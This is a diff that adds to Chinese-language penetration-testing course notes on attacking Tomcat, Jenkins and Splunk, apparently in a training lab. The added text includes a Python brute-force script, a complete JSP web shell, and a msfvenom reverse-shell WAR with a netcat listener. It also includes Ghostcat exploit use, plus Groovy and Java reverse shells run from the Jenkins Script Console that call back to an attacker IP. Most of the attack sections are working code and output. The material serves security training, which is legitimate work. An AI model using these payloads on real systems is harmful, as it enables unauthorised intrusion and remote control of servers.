@@ -683,7 +683,7 @@ $ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/roc
 <SNIP>
 
 [+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - john / firebird1                                                                                 
+[SUCCESS] - john / firebird1                                                                           
 Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
@@ -1034,7 +1034,7 @@ $ python2.7 -m pip install bs4
 $ python2.7 joomlascan.py -u http://dev.inlanefreight.local
 
 -------------------------------------------
-             Joomla Scan          
+             Joomla Scan    
    Usage: python joomlascan.py <target>  
     Version 0.5beta - Database Entries 1233
          created by Andrea Draghetti   
@@ -1144,7 +1144,7 @@ $ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrat
 |  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
 | |  | |/ ____ \| |_) | |__| | |__| | |_) |
 |_|  |_/_/    \_\____/ \____/ \____/|____/ 
-                                                               
+                                                         
 
 
 administrator
@@ -1227,7 +1227,7 @@ $ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
 ```bash
 $ droopescan scan drupal -u http://drupal.inlanefreight.local
 
-[+] Plugins found:                                                      
+[+] Plugins found:                                                
     php http://drupal.inlanefreight.local/modules/php/
         http://drupal.inlanefreight.local/modules/php/LICENSE.txt
 
@@ -1709,7 +1709,7 @@ lib 目录存放该 Web 应用自身需要的依赖库。jsp 目录存放[ Jakar
 
 ### 1.2 枚举
 
-对 Tomcat 实例进行指纹识别后，除非它存在已知漏洞，否则我们通常会查找` /manager `和 /host-manager 页面。我们可以使用 Gobuster 等工具来查找这些页面，或者直接访问它们。
+对 Tomcat 实例进行指纹识别后，除非它存在已知漏洞，否则我们通常会查找 `/manager`和 /host-manager 页面。我们可以使用 Gobuster 等工具来查找这些页面，或者直接访问它们。
 
 ```bash
 $ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
@@ -1740,3 +1740,1249 @@ Progress: 49959 / 87665 (56.99%)^C
 我们或许可以使用弱口令（比如 tomcat:tomcat、admin:admin 等）尝试登录其中某个后台。如果最初几次尝试不成功，我们还可以对登录页面进行密码暴力破解，这部分内容会在下一节讲解。一旦登录成功，我们就可以上传包含 JSP 木马的 [WAR 包（Web Application Archive/Web Application Resource）](https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web)，从而在 Tomcat 服务器上实现远程代码执行。
 
 现在我们已经了解了 Tomcat 的结构和功能，让我们通过滥用内置功能并利用影响特定 Tomcat 版本的一个众所周知的漏洞来攻击它。
+
+### 1.3 攻击
+
+我们已确认客户确实对外暴露了一台 Tomcat 主机。由于评估范围相对较小，且其他目标并非特别重要，因此我们将全力以赴，尝试通过 Tomcat 获取内部访问权限。
+
+如前一节所述，如果我们能够访问 /manager 或 /host-manager 端点，就很有可能在 Tomcat 服务器上实现远程代码执行。我们首先尝试暴力破解位于 http://web01.inlanefreight.local:8180 的 Tomcat 实例上的 Tomcat 管理器页面。为此，我们可以使用 Metasploit 的 [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) 模块、Burp Suite Intruder 或任何其他脚本。这里我们将使用 Metasploit。
+
+#### 1.3.1 登陆暴力破解
+
+我们首先需要设置一些选项。我们必须指定虚拟主机（vhost）和目标的 IP 地址，才能正常与目标交互。
+我们还应该将 STOP_ON_SUCCESS 设置为 true，这样一旦扫描器爆破出成功的登录，就会立即停止—— 在登录成功后继续发送大量请求是没有任何意义的。
+
+```bash
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
+```
+
+和往常一样，我们通过 show options 来检查是否一切都已正确设置。
+
+```bash
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                                 Required  Description
+   ----              ---------------                                                                 --------  -----------
+   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
+   PASSWORD                                                                                          no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT             8180                                                                            yes       The target port (TCP)
+   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
+   USERNAME                                                                                          no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   VERBOSE           true                                                                            yes       Whether to print output for all attempts
+   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host
+
+```
+
+使用run 指令开始执行漏洞测试,并找到了凭据对 tomcat:admin 。
+
+```bash
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
+[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+有一点很重要：作为渗透测试人员，我们可以使用的工具非常多。很多工具的存在就是为了提高工作效率，尤其是因为大多数渗透测试都是 ** 限时（time-boxed）** 的，或者处于严格的时间限制下。
+没有哪一款工具就一定比另一款更好，就算我们利用 Metasploit 这类工具来提高效率，也不代表我们是 “不专业 / 差劲” 的渗透测试人员。只要我们理解自己运行的每一款扫描器、每一个利用脚本，以及其中的风险，那么合理使用这类扫描器，和使用 Burp Intruder 或自己编写 Python 脚本本质上没有区别。
+有人常说：“要巧干，不要蛮干”（work smarter, not harder）。如果有现成工具可以帮我们，那为什么要在一场 40 小时、覆盖 1500 台目标主机的评估中，给自己增加额外工作量呢？
+对我们来说，理解工具原理，并且能手动完成很多操作至关重要。我们也可以选择在浏览器里手动逐个尝试账号密码，或者用 cURL、Python 写脚本实现。但至少，如果我们决定使用某款工具，就必须能够在评估过程中或评估结束后，当客户提出疑问时，清晰解释该工具的用途及其潜在影响。
+
+假设某个 Metasploit 模块（或其他工具）出现故障或运行异常。我们可以使用 Burp Suite 或 ZAP 来代理流量并进行故障排除。为此，首先启动 Burp Suite，然后按如下方式设置 PROXIES 选项：
+
+```bash
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
+
+PROXIES => HTTP:127.0.0.1:8080
+
+
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
+```
+
+在 Burp 中，我们可以清楚地看到扫描器是如何工作的，它会考虑 Tomcat 使用的基本身份验证的每个凭据对和 base64 编码。
+
+![1774679958290](images/AttackingCommonApplications/1774679958290.png)
+
+快速检查一个请求的 Authorization 标头值，可以看到扫描器运行正常，它对 admin:vagrant 凭据进行了 base64 编码，就像 Tomcat 应用程序在用户尝试直接从 Web 应用程序登录时所做的那样。本模块中的一些示例可以帮助您熟悉通过代理进行调试的方法。
+
+```bash
+$ echo YWRtaW46dmFncmFudA== |base64 -d
+
+admin:vagrant
+```
+
+我们也可以使用这个 Python 脚本来实现同样的效果。
+
+```python
+#!/usr/bin/python
+
+import requests
+from termcolor import cprint
+import argparse
+
+parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
+
+parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
+parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
+parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
+parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
+
+args = parser.parse_args()
+
+url = args.url
+uri = args.path
+users_file = args.usernames
+passwords_file = args.passwords
+
+new_url = url + uri
+f_users = open(users_file, "rb")
+f_pass = open(passwords_file, "rb")
+usernames = [x.strip() for x in f_users]
+passwords = [x.strip() for x in f_pass]
+
+cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
+
+for u in usernames:
+    for p in passwords:
+        r = requests.get(new_url,auth = (u, p))
+
+        if r.status_code == 200:
+            cprint("\n[+] Success!!", "green", attrs = ['bold'])
+            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
+            break
+    if r.status_code == 200:
+        break
+
+if r.status_code != 200:
+    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
+    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
+#print r.status_code
+```
+
+这是一个非常简单的脚本，只需要几个参数。我们可以加上 -h 参数来运行脚本，看看它需要哪些运行条件。
+
+如果您对脚本编写感兴趣，可以看看 “Python 3 入门” 和 “Bash 脚本入门” 这两个模块。一个不错的练习是使用 Python 和 Bash 创建 Tomcat 管理器暴力破解登录脚本，不过我们把这个练习留给您自己完成。
+
+#### 1.3.2 WAR 文件上传
+
+许多 Tomcat 安装版本都会提供一个 ** 图形化界面（GUI）** 来管理应用。该界面默认位于 /manager/html，只有被分配了 manager-gui 角色的用户才允许访问。
+拿到有效的 Manager 账号密码后，就可以上传打包好的 Tomcat 应用（.WAR 文件），进而控制整个应用系统。
+WAR（Web Application Archive，Web 应用归档包）用于快速部署 Web 应用，也用于备份存储。
+
+在执行暴力破解攻击并回答以下问题 1 和 2 之后，浏览到 http://web01.inlanefreight.local:8180/manager/html 并输入凭据。
+
+![1774680264987](images/AttackingCommonApplications/1774680264987.png)
+
+管理 Web 应用允许我们通过上传 WAR 文件来快速部署新应用。WAR 文件可以使用 zip 工具创建。像这样的 [JSP Web Shell ](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)可以下载并放入压缩包中
+
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+
+```bash
+$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+$ zip -r backup.war cmd.jsp 
+
+  adding: cmd.jsp (deflated 81%)
+```
+
+点击 Browse 选择 .war 文件，然后点击 Deploy 。
+
+![1774680497305](images/AttackingCommonApplications/1774680497305.png)
+
+将该文件上传到管理后台（Manager GUI）之后，/backup 这个应用就会出现在应用列表里。
+
+![1774680567795](images/AttackingCommonApplications/1774680567795.png)
+
+如果我们点击 backup，会被跳转到http://web01.inlanefreight.local:8180/backup/，并收到 404 未找到 错误。
+我们还需要在 URL 中指定 cmd.jsp 文件。访问 http://web01.inlanefreight.local:8180/backup/cmd.jsp 后，就会出现一个Web 木马页面，我们可以用它在 Tomcat 服务器上执行系统命令。
+接下来，我们可以把这个 Web 木马升级为一个交互式反弹 Shell，并继续深入提权。和前面的例子一样，我们既可以通过浏览器使用这个 Web 木马，也可以在命令行用 cURL 与其交互。两种方式都可以试试！
+
+```bash
+$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+Command: id<BR>
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+
+</pre>
+</BODY></HTML>
+```
+
+为了清理工作，我们可以返回 Tomcat 管理器主页面，点击 backups 应用程序旁边的 Undeploy 按钮。当然，前提是要记下报告的文件和上传位置，在本例中为 /opt/tomcat/apache-tomcat-10.0.10/webapps 。如果我们从 Web shell 对该目录执行 ls 命令，将会看到已上传的 backup.war 文件以及应用程序部署后创建的包含 cmd.jsp 脚本和 META-INF 文件的 backup 目录。点击 Undeploy 通常会删除已上传的 WAR 归档文件以及与该应用程序关联的目录。
+
+我们还可以使用 msfvenom 生成恶意 WAR 文件。有效载荷 [java/jsp_shell_reverse_tcp ](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb)将通过 JSP 文件执行反向 shell。浏览到 Tomcat 控制台并部署此文件。Tomcat 会自动提取 WAR 文件的内容并进行部署。
+
+```bash
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+
+Payload size: 1098 bytes
+Final size of war file: 1098 bytes
+```
+
+启动 Netcat 监听器，然后点击 /backup 执行 shell。
+
+```bash
+$ nc -lnvp 4443
+
+listening on [any] 4443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
+
+
+id
+
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+
+```
+
+可以使用 metasploit 的 [multi/http/tomcat_mgr_upload ](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)模块来自动化上述过程，但我们将此留给读者作为练习。
+
+这个[ JSP Web Shell ](https://github.com/SecurityRiskAdvisors/cmd.jsp)非常轻量级（小于 1kb），它利用书签或浏览器书签来执行 Web Shell 和用户界面功能所需的 JavaScript 代码。如果没有它，浏览上传的 cmd.jsp 文件将不会显示任何内容。这是一个极佳的选择，可以最大限度地减少我们的资源占用，并有可能绕过标准 JSP Web Shell 的检测（尽管可能需要对 JSP 代码进行一些修改）。
+
+#### 1.3.3 利用已知漏洞
+
+研究人员在近期发现的名为[ Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)（幽灵猫） 的漏洞中，Tomcat 被证实存在 ** 未授权本地文件包含（LFI）** 漏洞。所有早于 9.0.31、8.5.51 和 7.0.100 版本的 Tomcat 均受该漏洞影响。此漏洞由 Tomcat 使用的 AJP 协议配置不当所导致。AJP 全称 Apache Jserv Protocol（Apache Jserv 协议），是一种用于代理请求的二进制协议，通常用于将请求代理至前端 Web 服务器后方的应用服务器。
+
+AJP 服务通常运行在 Tomcat 服务器的 8009 端口。这可以通过 Nmap 定向扫描来验证。
+
+```bash
+$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
+Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
+Host is up (0.14s latency).
+
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+8080/tcp open  http    Apache Tomcat 9.0.30
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
+
+```
+
+上述扫描结果确认 8080 和 8009 端口已开放。漏洞的 PoC 代码可[在此处](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)找到。下载脚本并保存到本地。该漏洞利用程序只能读取 web apps 文件夹内的文件和文件夹，这意味着无法访问 /etc/passwd 等文件。接下来，我们尝试访问 web.xml 文件。
+
+```bash
+$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
+
+Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
+----------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to Tomcat
+  </description>
+
+</web-app>
+```
+
+在某些 Tomcat 安装中，我们可能能够访问 WEB-INF 文件中的敏感数据。
+
+在内部和外部渗透测试中，Tomcat 始终是一个值得关注的目标。每当我们遇到 Tomcat 时，都应该检查 Tomcat 管理器区域是否存在弱密码或默认密码。如果能够登录，我们就能迅速将访问权限转化为远程代码执行权限。Tomcat 通常以 SYSTEM 或 root 等高权限用户身份运行，因此值得深入研究，因为它可能为我们提供在 Linux 服务器或已加入域的 Windows 服务器（位于 Active Directory 环境中）上的特权立足点。
+
+## 2. Jenkins - 发现与枚举
+
+[Jenkins ](https://www.jenkins.io/)是一个用 Java 编写的开源自动化服务器，它可以帮助开发者持续构建和测试软件项目。它是一个基于服务器的系统，运行在 Tomcat 等 Servlet 容器中。多年来，研究人员发现了 Jenkins 中的各种漏洞，包括一些无需身份验证即可远程执行代码的漏洞。Jenkins 是一个[持续集成服务器](https://en.wikipedia.org/wiki/Continuous_integration)。
+
+### 2.1 识别
+
+假设我们正在进行内部渗透测试，并且已经完成了网络发现扫描。我们注意到一个疑似 Jenkins 实例，并且知道它通常安装在以权限极高的 SYSTEM 帐户运行的 Windows 服务器上。如果我们能够通过 Jenkins 获得访问权限，并以 SYSTEM 帐户执行远程代码，我们就能在 Active Directory 中获得立足点，从而开始枚举域环境。
+
+Jenkins 默认运行在 Tomcat 的 8080 端口，同时会使用 5000 端口接入从服务器（Slave Servers，也叫代理节点 / Agent），该端口用于 Jenkins 主节点与从节点之间的通信。
+Jenkins 支持多种身份认证方案：本地数据库、LDAP 目录服务、Unix 系统用户库、将安全校验委托给 Servlet 容器，甚至可以完全关闭身份认证。管理员还可配置是否允许普通用户自主注册账号。
+
+### 2.2 枚举
+
+![1774682671863](images/AttackingCommonApplications/1774682671863.png)
+
+默认安装通常使用 Jenkins 的数据库来存储凭据，并且不允许用户注册帐户。我们可以通过其独特的登录页面快速识别 Jenkins。
+
+![1774682696285](images/AttackingCommonApplications/1774682696285.png)
+
+我们可能会遇到使用弱凭据或默认凭据（例如 admin:admin 或未启用任何类型的身份验证的 Jenkins 实例。在内部渗透测试中，发现不需要任何身份验证的 Jenkins 实例并不罕见。虽然这种情况很少见，但我们在外部渗透测试中也遇到过可以攻击的 Jenkins 实例。
+
+### 2.3 攻击
+
+我们已确认主机正在运行 Jenkins，并且配置了弱凭据。让我们检查一下这会赋予我们什么样的访问权限。
+一旦我们获得了对 Jenkins 应用的访问权限，通过[Script Console](https://www.jenkins.io/doc/book/managing/script-console/)可以快速在底层服务器上执行命令。脚本控制台允许我们在 Jenkins 控制器运行时环境中运行任意 Groovy 脚本。我们可以利用这一点在底层服务器上运行操作系统命令。Jenkins 通常以 root 或 SYSTEM 账户身份安装，因此对我们来说很容易得手。
+
+#### 2.3.1 利用 Script Console
+
+脚本控制台可通过 URL http://jenkins.inlanefreight.local:8000/script 访问。该控制台允许用户运行 Apache Groovy 脚本，Groovy 是一种面向对象的 Java 兼容语言，类似于 Python 和 Ruby。Groovy 源代码会被编译成 Java 字节码，并可在任何安装了 JRE 的平台上运行。
+
+使用此脚本控制台，可以运行任意命令，其功能类似于 Web Shell。例如，我们可以使用以下代码片段运行 id 命令。
+
+```
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+
+![1774683794445](images/AttackingCommonApplications/1774683794445.png)
+
+可以通过多种方式利用脚本控制台的访问权限来获取反向 shell。例如，可以使用以下命令，或者使用 Metasploit 的这个[模块。](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+```
+
+运行上述命令会建立反向 shell 连接。
+
+```bash
+$ nc -lvnp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
+
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+/bin/bash -i
+
+```
+
+在攻击 Windows 主机时，我们可以尝试添加用户，然后通过 RDP 或 WinRM 连接上去。
+或者，为了不修改系统 **、不留痕迹，我们可以使用 PowerShell 下载器，运行[ Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 反弹 Shell。我们可以用下面这段代码，在 Windows 版 Jenkins 上执行命令：**
+
+```bash
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+
+我们还可以使用这个[ Java 反向 shell ](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)在 Windows 主机上执行命令，只需将 localhost 和端口替换为我们的 IP 地址和监听端口即可。
+
+```groovy
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+```
+
+#### 2.3.2 利用已知漏洞
+
+Jenkins 的多个版本中存在远程代码执行漏洞。最近，一种利用漏洞的攻击方法结合了 CVE-2018-1999002 和 [CVE-2019-1003000 ](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266)这两个漏洞，实现了预认证的远程代码执行，绕过了脚本编译期间的脚本安全沙箱保护。目前已有公开的漏洞利用 PoC，利用 Jenkins 动态路由中的一个缺陷绕过了“总体/读取”访问控制列表 (ACL)，并使用 Groovy 下载和执行恶意 JAR 文件。该缺陷允许具有读取权限的用户绕过沙箱保护，并在 Jenkins 主服务器上执行代码。此漏洞利用方法适用于 Jenkins 2.137 版本。
+
+Jenkins 2.150.2 版本中存在另一个漏洞，该漏洞允许拥有作业创建和构建权限的用户通过 Node.js 在系统上执行代码。此漏洞需要身份验证，但如果启用匿名用户，则攻击将成功，因为这些用户默认拥有作业创建和构建权限。
+
+正如我们所见，以管理员身份获取 Jenkins 的访问权限可以迅速导致远程代码执行 (RCE)。虽然目前存在一些针对 Jenkins 的有效 RCE 漏洞利用程序，但它们都与特定版本有关。截至撰写本文时，Jenkins 的最新 LTS 版本为 2.303.1，该版本修复了上述两个漏洞。与任何应用程序或系统一样，尽可能地加强 Jenkins 的安全防护至关重要，因为其内置功能很容易被利用来控制底层服务器。
+
+# 五. 基础设施和网络管理工具
+
+## 1.Splunk - 发现与枚举
+
+Splunk 是一款日志分析工具，用于收集、分析和可视化数据。虽然最初并非设计为安全信息和事件管理 (SIEM) 工具，但 Splunk 常用于安全监控和业务分析。Splunk 部署通常用于存储敏感数据，一旦遭到入侵，攻击者可能从中获取大量信息。历史上，Splunk 除了信息泄露漏洞 (CVE-2018-11409) 和早期版本中的认证远程代码执行漏洞 (CVE-2011-4642) 之外，鲜有其他已知漏洞。
+
+在评估过程中，我们经常会遇到 Splunk，尤其是在大型企业的内部渗透测试中。虽然我们也见过 Splunk 暴露在外部环境中的情况，但这比较少见。Splunk 本身可利用的漏洞并不多，而且修复问题的速度也很快。评估 Splunk 时，重点关注的是其薄弱的身份验证或空身份验证，因为 Splunk 的管理员权限使我们能够部署自定义应用程序，这些应用程序可以快速攻破 Splunk 服务器，并且根据 Splunk 的配置方式，可能还会攻破网络中的其他主机。
+
+### 1.1 识别
+
+Splunk 在内部网络中很常见，通常在 Linux 系统上以 root 用户身份运行，或在 Windows 系统上以 SYSTEM 用户身份运行。虽然不常见，但我们有时也会遇到面向外部的 Splunk。假设我们在 Aquatone 报告中发现了一个被遗忘的 Splunk 实例，它已经自动升级到无需身份验证的免费版本。由于我们尚未获得内部网络的访问权限，让我们将注意力集中在 Splunk 上，看看能否利用此访问权限进行远程代码执行 (RCE)。
+
+Splunk Web 服务器默认运行在 8000 端口。在旧版本的 Splunk 中，默认凭据为 admin:changeme ，这些凭据会方便地显示在登录页面上。
+
+![1774685798874](images/AttackingCommonApplications/1774685798874.png)
+
